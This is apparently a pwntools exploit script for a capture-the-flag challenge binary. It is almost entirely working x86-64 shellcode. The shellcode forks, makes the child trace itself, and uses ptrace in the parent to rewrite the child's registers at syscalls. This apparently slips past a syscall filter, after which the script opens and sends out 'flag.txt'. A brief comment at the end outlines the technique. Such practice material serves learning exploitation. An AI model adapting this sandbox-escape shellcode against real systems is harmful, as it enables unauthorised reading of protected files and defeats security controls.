from pwn import *
from icecream import ic

elf = exe = ELF("./chall")

context.binary = exe
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("localhost", 1337)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
b *0x0000000000401325
c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def uu64(a): return u64(re(a).ljust(8, b"\x00"))
def gad(a, b): return ROP(a).find_gadget(b)[0]
def qgad(a, b): return ROP(a).find_gadget([f"pop " + b, "ret"])[0]
def binsh(a): return next(a.search(b"/bin/sh\x00"))
def i(): return io.interactive()

io = start()

sla("code size: ", "998")

PTRACE = 101
WAIT_4 = 61
PTRACE_SYSCALL = 24
PTRACE_GETREGS = 12
PTRACE_SETREGS = 13
PTRACE_CONT = 7

shellcode = asm(f"""
                mov rax, 57
                syscall 
                cmp rax, 0
                jz child
                
                mov r13, rax

                mov rax, {WAIT_4}
                mov rdi, r13
                xor rsi, rsi
                xor rdx, rdx
                xor r10, r10
                syscall

                mov rax, {PTRACE}
                mov rdi, {PTRACE_SYSCALL}
                mov rsi, r13
                xor rdx, rdx
                xor r10, r10
                syscall

                mov rax, {WAIT_4}
                mov rdi, r13
                xor rsi, rsi
                xor rdx, rdx
                xor r10, r10
                syscall

                mov rax, {PTRACE}
                mov rdi, {PTRACE_GETREGS}
                mov rsi, r13
                xor rdx, rdx
                mov r10, rsp
                syscall

                // set rip to an arbitrary addr
                mov rdi, 0xdeadbeefcafebabe
                lea rbx, [rsp+{128}]
                mov [rbx], rdi

                mov rax, {PTRACE}
                mov rdi, {PTRACE_SETREGS}
                mov rsi, r13
                xor rdx, rdx
                mov r10, rsp
                syscall

                // continue to next syscall
                mov rax, {PTRACE}
                mov rdi, {PTRACE_CONT}
                mov rsi, r13
                xor rdx, rdx
                xor r10, r10
                syscall

                mov rax, {WAIT_4}
                mov rdi, r13
                mov rsi, rsp
                xor rdx, rdx
                xor r10, r10
                syscall

                mov rax, {PTRACE}
                mov rdi, {PTRACE_GETREGS}
                mov rsi, r13
                xor rdx, rdx
                mov r10, rsp
                syscall
                                                                                                            
                lea rdi, [rip+sendfile]
                lea rbx, [rsp+{128}]
                mov [rbx], rdi

                mov rax, {PTRACE}
                mov rdi, {PTRACE_SETREGS}
                mov rsi, r13
                xor rdx, rdx
                mov r10, rsp
                syscall
            
                mov rax, {PTRACE}
                mov rdi, {PTRACE_SYSCALL}
                mov rsi, r13
                xor rdx, rdx
                xor r10, r10
                syscall
                            
                mov rax, {WAIT_4}
                mov rdi, r13
                xor rsi, rsi
                xor rdx, rdx
                xor r10, r10
                syscall
                                                
                mov rax, {PTRACE}
                mov rdi, {PTRACE_GETREGS}
                mov rsi, r13
                xor rdx, rdx
                mov r10, rsp
                syscall
                        
                mov rdi, 0xdeadbeefdeadbeef
                lea rbx, [rsp+{128}]
                mov [rbx], rdi
                
                mov rax, {PTRACE}
                mov rdi, {PTRACE_SETREGS}
                mov rsi, r13
                xor rdx, rdx
                mov r10, rsp
                syscall
                            
                mov rax, {PTRACE}
                mov rdi, {PTRACE_CONT}
                mov rsi, r13
                xor rdx, rdx
                xor r10, r10
                syscall
                            
                mov rax, {WAIT_4}
                mov rdi, r13
                xor rsi, rsi
                xor rdx, rdx
                xor r10, r10
                syscall

                hlt

            child:
                xor rdi, rdi
                xor rsi, rsi
                xor rdx, rdx
                xor r10, r10
                mov rax, {PTRACE}
                syscall
                int3      

                mov dword ptr [rsp], 0x67616c66
                mov dword ptr [rsp+4], 0x7478742e
                mov byte ptr [rsp+8], 0x00
                lea rdi, [rsp]
                mov rax, 2
                xor rsi, rsi
                xor rdx, rdx
                syscall
            
            sendfile:
                mov rdi, 1
                mov rsi, rax
                mov rax, 40
                xor rdx, rdx
                mov r10, 0x40
                syscall
                
""")

sl(shellcode)

io.interactive()
"""
* fork and create a child

* from child attach ptrace
* add the necessary syscalls to be modified in the later run
* put an int3 after this

* in parent, recieve the int3 and setup ptrace to give an interrupt when a syscall is made from child
* wait for syscall to happen.
* when syscall happens modify the registers and continue waiting for other syscall
* do the same for both syscalls
"""